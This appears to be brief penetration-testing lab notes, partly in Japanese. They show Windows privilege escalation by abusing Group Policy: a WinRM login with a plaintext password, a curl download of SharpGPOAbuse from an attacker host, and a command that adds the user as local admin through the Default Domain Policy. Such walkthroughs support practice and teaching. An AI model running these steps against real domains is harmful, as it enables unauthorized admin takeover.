\# Initial Access

![[wt image 7.png]]

└─$ evil-winrm -i 192.168.148.97 -u 'charlotte' -p 'Game2On4.!'

![[wt image 8.png]]

![[wt image 9.png]]

![[wt image 10.png]]

\# Enum

![[wt image 11.png]]

\# PE

https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7

\# 権限調査

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

![[wt image 12.png]]

※コンパイルが必要

https://github.com/FSecureLABS/SharpGPOAbuse

※最初からコンパイル済

https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe

curl http://192.168.45.231/SharpGPOAbuse.exe -o SharpGPOAbuse.exe

.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"

gpupdate /force

![[wt image 13.png]]

System Shell

![[wt image 14.png]]